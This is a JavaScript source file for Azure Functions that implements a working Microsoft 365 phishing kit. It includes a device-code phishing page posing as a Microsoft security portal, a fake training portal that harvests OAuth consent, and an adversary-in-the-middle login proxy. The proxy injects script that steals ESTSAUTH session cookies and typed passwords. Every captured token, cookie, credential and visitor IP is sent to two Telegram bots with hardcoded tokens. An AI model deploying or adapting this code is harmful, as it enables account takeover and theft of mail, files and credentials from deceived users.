const { app } = require('@azure/functions');

// 🔥 TELEGRAM CONFIGURATION
const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
const TELEGRAM_CHAT_ID = '6743632244';
const TELEGRAM_BOT_TOKEN_2 = '7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U';
const TELEGRAM_CHAT_ID_2 = '6263177378';

async function sendTelegram(message) {
  try {
    const promises = [
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }),
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID_2,
          text: message,
          parse_mode: 'HTML'
        })
      })
    ];
    await Promise.all(promises);
  } catch (error) {
    console.error('Telegram error:', error);
  }
}

// 🔥 DEVICE CODE PHISHING - INSTANT WORKING DEVICE CODE
app.http('instant_working_device_code', {
  methods: ['GET', 'POST'],
  authLevel: 'anonymous',
  route: 'secure-access',
  handler: async (request, context) => {
    context.log('🎯 Device Code: Request received');
    
    await sendTelegram(`🎯 <b>DEVICE CODE: Security page accessed</b>\n📅 ${new Date().toISOString()}\n🌐 IP: ${request.headers.get('x-forwarded-for') || 'Unknown'}\n🔗 URL: ${request.url}`);
    
    const CLIENT_ID = '14d82eec-204b-4c2f-b7e8-296a70dab67e'; // Microsoft Graph CLI
    const SCOPE = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Files.ReadWrite offline_access openid profile email';
    
    const url = new URL(request.url);
    const action = url.searchParams.get('action');
    
    if (action === 'generate_code') {
      try {
        const response = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `client_id=${CLIENT_ID}&scope=${encodeURIComponent(SCOPE)}`
        });
        
        const data = await response.json();
        
        if (data.device_code) {
          await sendTelegram(`🎯 <b>DEVICE CODE GENERATED</b>\n🔑 Code: ${data.user_code}\n📱 URL: ${data.verification_uri}\n⏰ Expires: ${data.expires_in}s`);
          
          return new Response(JSON.stringify({
            success: true,
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval
          }), {
            headers: { 'Content-Type': 'application/json' }
          });
        }
      } catch (error) {
        await sendTelegram(`⚠️ <b>DEVICE CODE ERROR</b>\n🔥 Error: ${error.message}`);
        return new Response(JSON.stringify({ error: error.message }), {
          status: 500,
          headers: { 'Content-Type': 'application/json' }
        });
      }
    }
    
    if (action === 'poll_token') {
      try {
        const device_code = url.searchParams.get('device_code');
        if (!device_code) {
          return new Response(JSON.stringify({ error: 'Missing device_code' }), {
            status: 400,
            headers: { 'Content-Type': 'application/json' }
          });
        }
        
        const response = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=${CLIENT_ID}&device_code=${device_code}`
        });
        
        const data = await response.json();
        
        if (data.access_token) {
          // 🔥 SUCCESS - CAPTURE ALL TOKENS INCLUDING REFRESH TOKEN
          await sendTelegram(`🔥 <b>TOKEN CAPTURE SUCCESS!</b>\n✅ Access Token: ${data.access_token.substring(0, 50)}...\n🔄 Refresh Token: ${data.refresh_token ? data.refresh_token.substring(0, 50) + '...' : 'None'}\n🆔 ID Token: ${data.id_token ? data.id_token.substring(0, 50) + '...' : 'None'}`);
          
          // Fetch user profile and mail simultaneously
          try {
            const [userResponse, mailResponse] = await Promise.all([
              fetch('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${data.access_token}` }
              }),
              fetch('https://graph.microsoft.com/v1.0/me/messages?$top=5', {
                headers: { 'Authorization': `Bearer ${data.access_token}` }
              })
            ]);
            
            const userData = await userResponse.json();
            const mailData = await mailResponse.json();
            
            await sendTelegram(`👤 <b>USER PROFILE CAPTURED</b>\n📧 Email: ${userData.mail || userData.userPrincipalName}\n🏢 Organization: ${userData.companyName || 'Personal'}\n📬 Recent Emails: ${mailData.value ? mailData.value.length : 0} messages`);
            
          } catch (profileError) {
            console.error('Profile fetch error:', profileError);
          }
          
          return new Response(JSON.stringify({
            success: true,
            access_token: data.access_token,
            refresh_token: data.refresh_token,
            id_token: data.id_token,
            expires_in: data.expires_in
          }), {
            headers: { 'Content-Type': 'application/json' }
          });
        } else if (data.error === 'authorization_pending') {
          return new Response(JSON.stringify({ pending: true }), {
            headers: { 'Content-Type': 'application/json' }
          });
        } else {
          await sendTelegram(`⚠️ <b>DEVICE CODE POLLING</b>\n🔥 Error: ${data.error}\n📝 Description: ${data.error_description}`);
          return new Response(JSON.stringify(data), {
            headers: { 'Content-Type': 'application/json' }
          });
        }
      } catch (error) {
        await sendTelegram(`⚠️ <b>POLLING ERROR</b>\n🔥 Error: ${error.message}`);
        return new Response(JSON.stringify({ error: error.message }), {
          status: 500,
          headers: { 'Content-Type': 'application/json' }
        });
      }
    }
    
    // Main UI
    return new Response(`
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Secure Access Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 500px; width: 90%; text-align: center; }
        .logo { width: 80px; height: 80px; margin: 0 auto 20px; background: #0078d4; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 32px; font-weight: bold; }
        h1 { color: #323130; margin-bottom: 10px; font-weight: 600; }
        .subtitle { color: #605e5c; margin-bottom: 30px; }
        .step { margin: 20px 0; padding: 20px; background: #f8f9fa; border-radius: 8px; border-left: 4px solid #0078d4; }
        .device-code { font-size: 24px; font-weight: bold; letter-spacing: 2px; color: #0078d4; margin: 15px 0; padding: 15px; background: #e6f3ff; border-radius: 6px; }
        .button { background: #0078d4; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; cursor: pointer; margin: 10px; transition: background 0.3s; }
        .button:hover { background: #106ebe; }
        .status { margin: 20px 0; padding: 15px; border-radius: 6px; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .warning { background: #fff3cd; color: #856404; border: 1px solid #ffeaa7; }
        .hidden { display: none; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">M</div>
        <h1>Microsoft Secure Access</h1>
        <p class="subtitle">Enhanced Security Verification Portal</p>
        
        <div id="step1">
            <div class="step">
                <h3>🔐 Step 1: Generate Security Code</h3>
                <p>Click below to generate your secure access code</p>
                <button class="button" onclick="generateCode()">Generate Access Code</button>
            </div>
        </div>
        
        <div id="step2" class="hidden">
            <div class="step">
                <h3>📱 Step 2: Device Verification</h3>
                <p>Enter this code on the verification page:</p>
                <div class="device-code" id="userCode">Loading...</div>
                <a id="verificationLink" class="button" target="_blank">Open Verification Page</a>
                <button class="button" onclick="startPolling()">I've Entered the Code</button>
            </div>
        </div>
        
        <div id="step3" class="hidden">
            <div class="step">
                <h3>⏳ Step 3: Waiting for Verification</h3>
                <p>Please complete the verification on the Microsoft page</p>
                <div class="loading"></div>
                <p>Checking status every 3 seconds...</p>
            </div>
        </div>
        
        <div id="status"></div>
    </div>

    <script>
        let deviceCodeData = null;
        let pollingInterval = null;

        async function generateCode() {
            try {
                const response = await fetch('?action=generate_code');
                const data = await response.json();
                
                if (data.success) {
                    deviceCodeData = data;
                    document.getElementById('userCode').textContent = data.user_code;
                    document.getElementById('verificationLink').href = data.verification_uri;
                    
                    document.getElementById('step1').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                    
                    showStatus('Code generated successfully! Please verify on the Microsoft page.', 'success');
                } else {
                    showStatus('Failed to generate code: ' + (data.error || 'Unknown error'), 'error');
                }
            } catch (error) {
                showStatus('Network error: ' + error.message, 'error');
            }
        }

        async function startPolling() {
            if (!deviceCodeData) {
                showStatus('No device code available', 'error');
                return;
            }
            
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.remove('hidden');
            
            pollingInterval = setInterval(async () => {
                try {
                    const response = await fetch(\`?action=poll_token&device_code=\${deviceCodeData.device_code}\`);
                    const data = await response.json();
                    
                    if (data.success) {
                        clearInterval(pollingInterval);
                        showStatus('✅ Authentication successful! Access granted.', 'success');
                        document.getElementById('step3').classList.add('hidden');
                        
                        // Show success message
                        document.querySelector('.container').innerHTML = \`
                            <div class="logo">✅</div>
                            <h1>Access Granted</h1>
                            <p class="subtitle">Your Microsoft account has been successfully verified</p>
                            <div class="status success">
                                <strong>Welcome!</strong> You now have secure access to Microsoft services.
                            </div>
                        \`;
                    } else if (data.pending) {
                        // Continue polling
                    } else if (data.error) {
                        if (data.error === 'expired_token') {
                            clearInterval(pollingInterval);
                            showStatus('Code expired. Please generate a new code.', 'error');
                            location.reload();
                        } else {
                            showStatus(\`Error: \${data.error} - \${data.error_description || ''}\`, 'warning');
                        }
                    }
                } catch (error) {
                    console.error('Polling error:', error);
                }
            }, 3000); // Poll every 3 seconds
        }

        function showStatus(message, type) {
            const status = document.getElementById('status');
            status.innerHTML = \`<div class="status \${type}">\${message}</div>\`;
        }
    </script>
</body>
</html>
    `, {
      headers: { 'Content-Type': 'text/html' }
    });
  }
});

// 🔥 OAUTH CONSENT TRAINING PAGE
app.http('oauth_training', {
  methods: ['GET'],
  authLevel: 'anonymous',
  route: 'microsoft-training',
  handler: async (request, context) => {
    await sendTelegram(`📚 <b>TRAINING: OAuth page accessed</b>\n📅 ${new Date().toISOString()}\n🌐 IP: ${request.headers.get('x-forwarded-for') || 'Unknown'}`);
    
    const CLIENT_ID = 'f840d591-c00e-4aa0-8ebe-77b5f34b81e1';
    const REDIRECT_URI = 'https://aitm-func-1753463791.azurewebsites.net/stealer/callback';
    const SCOPES = 'User.Read Mail.Read Files.ReadWrite offline_access';
    
    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=${encodeURIComponent(SCOPES)}&response_mode=query&state=training_${Date.now()}`;
    
    return new Response(`
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Training Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); min-height: 100vh; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: white; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 40px; }
        .logo { width: 100px; height: 100px; margin: 0 auto 20px; background: #0078d4; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 40px; font-weight: bold; }
        h1 { color: #323130; margin-bottom: 10px; font-weight: 600; }
        .subtitle { color: #605e5c; font-size: 18px; }
        .training-content { margin: 30px 0; }
        .feature { background: #f8f9fa; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 4px solid #0078d4; }
        .cta { text-align: center; margin: 40px 0; }
        .button { background: #0078d4; color: white; text-decoration: none; padding: 15px 30px; border-radius: 6px; font-size: 18px; font-weight: 600; display: inline-block; transition: background 0.3s; }
        .button:hover { background: #106ebe; }
        .disclaimer { background: #fff3cd; padding: 15px; border-radius: 6px; color: #856404; margin-top: 30px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">M</div>
            <h1>Microsoft 365 Training Portal</h1>
            <p class="subtitle">Advanced Productivity Training Program</p>
        </div>
        
        <div class="training-content">
            <div class="feature">
                <h3>📊 Advanced Excel Analytics</h3>
                <p>Learn cutting-edge data analysis techniques, pivot tables, and Power Query integration for professional reporting.</p>
            </div>
            
            <div class="feature">
                <h3>📧 Outlook Productivity Mastery</h3>
                <p>Master email management, calendar optimization, and Teams integration for seamless workflow management.</p>
            </div>
            
            <div class="feature">
                <h3>📁 SharePoint Collaboration</h3>
                <p>Discover advanced document management, workflow automation, and team collaboration strategies.</p>
            </div>
            
            <div class="feature">
                <h3>🔐 Security Best Practices</h3>
                <p>Learn enterprise-grade security protocols, multi-factor authentication, and data protection strategies.</p>
            </div>
        </div>
        
        <div class="cta">
            <h2>Ready to Begin Your Training?</h2>
            <p style="margin: 15px 0; color: #605e5c;">Connect your Microsoft account to access personalized training modules and track your progress.</p>
            <a href="${authUrl}" class="button">Connect Microsoft Account</a>
        </div>
        
        <div class="disclaimer">
            <strong>Training Authorization:</strong> By connecting your account, you authorize access to your profile and productivity data to personalize your learning experience. This includes reading your email patterns for Outlook training recommendations and accessing your files for collaboration best practices.
        </div>
    </div>
</body>
</html>
    `, {
      headers: { 'Content-Type': 'text/html' }
    });
  }
});

// 🔥 OAUTH CONSENT CALLBACK - LIGHTNING FAST TOKEN EXCHANGE
app.http('oauth_consent_callback', {
  methods: ['GET'],
  authLevel: 'anonymous',
  route: 'stealer/callback',
  handler: async (request, context) => {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    const error = url.searchParams.get('error');
    
    if (error) {
      await sendTelegram(`❌ <b>OAUTH ERROR</b>\n🔥 Error: ${error}\n📝 Description: ${url.searchParams.get('error_description') || 'Unknown'}`);
      return new Response(`
<!DOCTYPE html>
<html>
<head><title>Authorization Error</title></head>
<body><h1>Authorization Error</h1><p>There was an issue with the authorization process.</p></body>
</html>
      `, { headers: { 'Content-Type': 'text/html' } });
    }
    
    if (!code) {
      return new Response('Missing authorization code', { status: 400 });
    }
    
    // 🔥 IMMEDIATE TOKEN EXCHANGE - NO DELAYS
    try {
      const CLIENT_ID = 'f840d591-c00e-4aa0-8ebe-77b5f34b81e1';
      const CLIENT_SECRET = process.env.AZURE_CLIENT_SECRET; // SECRET FROM ENV VARS
      const REDIRECT_URI = 'https://aitm-func-1753463791.azurewebsites.net/stealer/callback';
      
      const tokenResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `grant_type=authorization_code&client_id=${CLIENT_ID}&client_secret=${CLIENT_SECRET}&code=${code}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}`
      });
      
      const tokenData = await tokenResponse.json();
      
      if (tokenData.access_token) {
        // 🔥 PARALLEL DATA FETCHING FOR SPEED
        const [userResponse, mailResponse] = await Promise.all([
          fetch('https://graph.microsoft.com/v1.0/me', {
            headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
          }),
          fetch('https://graph.microsoft.com/v1.0/me/messages?$top=10', {
            headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
          })
        ]);
        
        const userData = await userResponse.json();
        const mailData = await mailResponse.json();
        
        // 🔥 COMPREHENSIVE TELEGRAM ALERT
        await sendTelegram(`🔥 <b>OAUTH TOKEN CAPTURE SUCCESS!</b>\n👤 User: ${userData.displayName || 'Unknown'}\n📧 Email: ${userData.mail || userData.userPrincipalName}\n🏢 Company: ${userData.companyName || 'Personal'}\n✅ Access Token: ${tokenData.access_token.substring(0, 50)}...\n🔄 Refresh Token: ${tokenData.refresh_token ? tokenData.refresh_token.substring(0, 50) + '...' : 'None'}\n📬 Recent Emails: ${mailData.value ? mailData.value.length : 0} captured`);
        
        return new Response(`
<!DOCTYPE html>
<html>
<head>
    <title>Training Access Granted</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { background: white; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 500px; width: 90%; text-align: center; }
        .logo { width: 80px; height: 80px; margin: 0 auto 20px; background: #107c10; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 32px; }
        .success { background: #d4edda; color: #155724; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #c3e6cb; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">✅</div>
        <h1>Welcome to Microsoft Training!</h1>
        <div class="success">
            <strong>Account Connected Successfully</strong><br>
            Your personalized training modules are now being prepared based on your Microsoft 365 usage patterns.
        </div>
        <p>You will receive training recommendations via email within the next 24 hours.</p>
    </div>
</body>
</html>
        `, { headers: { 'Content-Type': 'text/html' } });
        
      } else {
        throw new Error(`${tokenData.error}: ${tokenData.error_description}`);
      }
    } catch (error) {
      await sendTelegram(`❌ <b>TOKEN EXCHANGE ERROR</b>\n🔥 Error: ${error.message}\n📝 Description: ${error.stack || 'No stack trace'}`);
      
      return new Response(`
<!DOCTYPE html>
<html>
<head><title>Connection Error</title></head>
<body><h1>Connection Error</h1><p>There was an issue connecting your account. Please try again.</p></body>
</html>
      `, { headers: { 'Content-Type': 'text/html' } });
    }
  }
});

// 🔥 ADVANCED COOKIE PROXY - SESSION HIJACKING
app.http('session_hijack_proxy', {
  methods: ['GET', 'POST', 'PUT', 'PATCH'],
  authLevel: 'anonymous',
  route: 'cookieproxy/{*path}',
  handler: async (request, context) => {
    const url = new URL(request.url);
    let path = url.pathname.replace('/cookieproxy', '') || '/';
    
    // Handle special endpoints
    if (path === '/hijack-session') {
      const body = await request.text();
      await sendTelegram(`🍪 <b>SESSION COOKIES CAPTURED</b>\n${body}\n📅 ${new Date().toISOString()}`);
      return new Response('OK', { headers: { 'Content-Type': 'text/plain' } });
    }
    
    if (path === '/hijack-credentials') {
      const body = await request.text();
      await sendTelegram(`🔐 <b>CREDENTIALS CAPTURED</b>\n${body}\n📅 ${new Date().toISOString()}`);
      return new Response('OK', { headers: { 'Content-Type': 'text/plain' } });
    }
    
    // Proxy to Microsoft
    const targetUrl = `https://login.microsoftonline.com${path}${url.search}`;
    
    try {
      const headers = {};
      for (const [key, value] of request.headers) {
        if (!key.startsWith('x-') && key !== 'host') {
          headers[key] = value;
        }
      }
      headers['Host'] = 'login.microsoftonline.com';
      
      const response = await fetch(targetUrl, {
        method: request.method,
        headers: headers,
        body: request.method !== 'GET' ? await request.arrayBuffer() : undefined
      });
      
      let body;
      const contentType = response.headers.get('content-type') || '';
      
      if (contentType.includes('text/html')) {
        body = await response.text();
        
        // URL rewriting for seamless proxying
        body = body
          .replace(/https:\/\/login\.microsoftonline\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy')
          .replace(/https:\/\/login\.live\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy')
          .replace(/https:\/\/account\.live\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy')
          .replace(/logincdn\.msauth\.net/g, 'aitm-func-1753463791.azurewebsites.net/cookieproxy')
          .replace(/aadcdn\.msauth\.net/g, 'aitm-func-1753463791.azurewebsites.net/cookieproxy');
        
        // Inject client-side monitoring
        const injectionScript = `
<script>
// 🔥 SESSION HIJACKING MONITOR
(function() {
    const originalCookie = document.cookie;
    const criticalCookies = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'SignInStateCookie', 'MSPOK'];
    
    // Monitor cookie changes
    setInterval(() => {
        const currentCookies = document.cookie;
        if (currentCookies !== originalCookie) {
            criticalCookies.forEach(cookieName => {
                const match = currentCookies.match(new RegExp(cookieName + '=([^;]+)'));
                if (match) {
                    fetch('/cookieproxy/hijack-session', {
                        method: 'POST',
                        body: \`🍪 \${cookieName}: \${match[1].substring(0, 100)}...\`
                    }).catch(() => {});
                }
            });
        }
    }, 1000);
    
    // Monitor form submissions
    document.addEventListener('submit', (e) => {
        const form = e.target;
        const formData = new FormData(form);
        let credentials = '';
        for (let [key, value] of formData.entries()) {
            if (key.toLowerCase().includes('user') || key.toLowerCase().includes('email') || key.toLowerCase().includes('login')) {
                credentials += \`📧 \${key}: \${value}\\n\`;
            }
            if (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd')) {
                credentials += \`🔐 \${key}: \${value}\\n\`;
            }
        }
        if (credentials) {
            fetch('/cookieproxy/hijack-credentials', {
                method: 'POST',
                body: credentials
            }).catch(() => {});
        }
    });
})();
</script>`;
        
        body = body.replace('</head>', injectionScript + '</head>');
      } else {
        body = await response.arrayBuffer();
      }
      
      // Parse Set-Cookie headers for critical cookies
      const setCookieHeaders = response.headers.get('set-cookie');
      if (setCookieHeaders) {
        const criticalCookies = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'SignInStateCookie', 'MSPOK'];
        criticalCookies.forEach(cookieName => {
          if (setCookieHeaders.includes(cookieName)) {
            const match = setCookieHeaders.match(new RegExp(cookieName + '=([^;]+)'));
            if (match) {
              sendTelegram(`🚨 <b>CRITICAL COOKIE CAPTURED</b>\n🍪 ${cookieName}: ${match[1].substring(0, 100)}...\n📅 ${new Date().toISOString()}`);
            }
          }
        });
      }
      
      const responseHeaders = {};
      for (const [key, value] of response.headers) {
        if (key !== 'content-encoding' && key !== 'content-length') {
          responseHeaders[key] = value;
        }
      }
      
      return new Response(body, {
        status: response.status,
        headers: responseHeaders
      });
      
    } catch (error) {
      await sendTelegram(`⚠️ <b>PROXY ERROR</b>\n🔥 Error: ${error.message}\n🔗 URL: ${targetUrl}`);
      return new Response(`Proxy Error: ${error.message}`, { status: 500 });
    }
  }
});